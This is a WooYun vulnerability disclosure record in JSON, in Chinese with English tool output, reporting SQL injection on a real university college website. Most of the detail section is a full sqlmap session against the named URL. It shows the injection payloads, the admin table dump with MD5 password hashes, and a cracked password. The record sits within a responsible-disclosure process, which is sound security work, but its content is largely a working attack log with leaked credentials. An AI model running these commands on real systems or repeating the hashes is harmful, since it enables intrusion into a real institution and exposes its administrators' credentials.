{"id": 53698, "wybug_id": "wooyun-2014-066764", "wybug_title": "东莞理工学院城市学院网站存在sql注射", "wybug_corp": "东莞理工学院", "wybug_author": "小周周", "wybug_date": "2014-07-03 11:32", "wybug_open_date": "2014-08-17 11:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向公众公开  简要描述： 东莞理工学院城市学院网站存在sql注射，可以爆出管理员账号密码。 详细说明：  东莞理工学院城市学院网站存在sql注射，可以爆出管理员账号密码。   漏洞证明：  sqlmap测试情况：D:\\Python27\\sqlmap>sqlmap.py -u http://csxy.dgut.edu.cn/about.php?id=1 -D csxy_index -T dhu_admin -C \"admin,pws\" --dump    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:29:44[18:29:44] [INFO] testing connection to the target URL[18:29:44] [INFO] testing if the target URL is stable. This can take a couple of seconds[18:29:46] [INFO] target URL is stable[18:29:46] [INFO] testing if GET parameter 'id' is dynamic[18:29:46] [INFO] confirming that GET parameter 'id' is dynamic[18:29:46] [INFO] GET parameter 'id' is dynamic[18:29:47] [ERROR] possible integer casting detected (e.g. \"$id=intval($_REQUEST['id'])\") at the back-end web applicationdo you want to skip those kind of cases (and save scanning time)? [y/N][18:29:49] [INFO] testing for SQL injection on GET parameter 'id'[18:29:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[18:29:57] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[18:30:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[18:30:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[18:30:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[18:30:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[18:30:02] [INFO] testing 'MySQL inline queries'[18:30:02] [INFO] testing 'PostgreSQL inline queries'[18:30:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[18:30:02] [INFO] testing 'Oracle inline queries'[18:30:02] [INFO] testing 'SQLite inline queries'[18:30:02] [INFO] testing 'MySQL > 5.0.11 stacked queries'[18:30:02] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[18:30:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[18:30:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[18:30:03] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[18:30:14] [INFO] GET parameter 'id' seems to be 'MySQL > 5.0.11 AND time-basedblind' injectable[18:30:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[18:30:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[18:30:14] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[18:30:16] [INFO] target URL appears to have 8 columns in query[18:30:21] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectableGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 50 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1' AND 7800=7800 AND 'fPAl'='fPAl    Type: UNION query    Title: MySQL UNION query (NULL) - 8 columns    Payload: id=-1994' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7173756771,0x5a41447350754d417447,0x7172646171),NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=1' AND SLEEP(5) AND 'jIqo'='jIqo---[18:30:34] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.17back-end DBMS: MySQL 5.0.11[18:30:34] [INFO] fetching columns 'admin, pws' for table 'dhu_admin' in database 'csxy_index'[18:30:35] [INFO] the SQL query used returns 2 entries[18:30:35] [INFO] retrieved: \"admin\",\"varchar(200)\"[18:30:35] [INFO] retrieved: \"pws\",\"varchar(200)\"[18:30:36] [INFO] fetching entries of column(s) 'admin, pws' for table 'dhu_admin' in database 'csxy_index'[18:30:36] [INFO] the SQL query used returns 4 entries[18:30:36] [INFO] retrieved: \"admin\",\"6f0f1fbc66e5310e6f667d75e9717225\"[18:30:37] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[18:30:37] [INFO] retrieved: \"??\",\"e01abc390b8359ebc6e39a335ecdc390\"[18:30:37] [INFO] retrieved: \"??\",\"e10adc3949ba59abbe56e057f20f883e\"[18:30:38] [INFO] retrieved: \"???\",\"1fde2e6603153eb32a2c95df999fa026\"[18:30:38] [INFO] analyzing table dump for possible password hashes[18:30:38] [INFO] recognized possible password hashes in column 'pws'do you want to store hashes to a temporary file for eventual further processingwith other tools [y/N]do you want to crack them via a dictionary-based attack? [Y/n/q][18:30:42] [INFO] using hash method 'md5_generic_passwd'what dictionary do you want to use?[1] default dictionary file 'D:\\Python27\\sqlmap\\txt\\wordlist.zip' (press Enter)[2] custom dictionary file[3] file with list of dictionary files>[18:30:42] [INFO] using default dictionarydo you want to use common password suffixes? (slow!) [y/N][18:30:43] [INFO] starting dictionary-based cracking (md5_generic_passwd)[18:30:43] [INFO] starting 4 processes[18:30:44] [INFO] cracked password '123456' for hash 'e10adc3949ba59abbe56e057f20f883e'[18:31:03] [INFO] postprocessing table dumpDatabase: csxy_indexTable: dhu_admin[4 entries]+-------------------------------------------+-------+| pws                                       | admin |+-------------------------------------------+-------+| 6f0f1fbc66e5310e6f667d75e9717225          | admin || e01abc390b8359ebc6e39a335ecdc390          | ??    || e10adc3949ba59abbe56e057f20f883e (123456) | ??    || 1fde2e6603153eb32a2c95df999fa026          | ???   |+-------------------------------------------+-------+[18:31:03] [INFO] table 'csxy_index.dhu_admin' dumped to CSV file 'D:\\Python27\\sqlmap\\output\\csxy.dgut.edu.cn\\dump\\csxy_index\\dhu_admin.csv'[18:31:03] [INFO] fetched data logged to text files under 'D:\\Python27\\sqlmap\\output\\csxy.dgut.edu.cn'[*] shutting down at 18:31:03   修复方案：  过滤   版权声明：转载请注明来源 小周周@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-07-03 13:13 厂商回复： 已通知相关学校处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}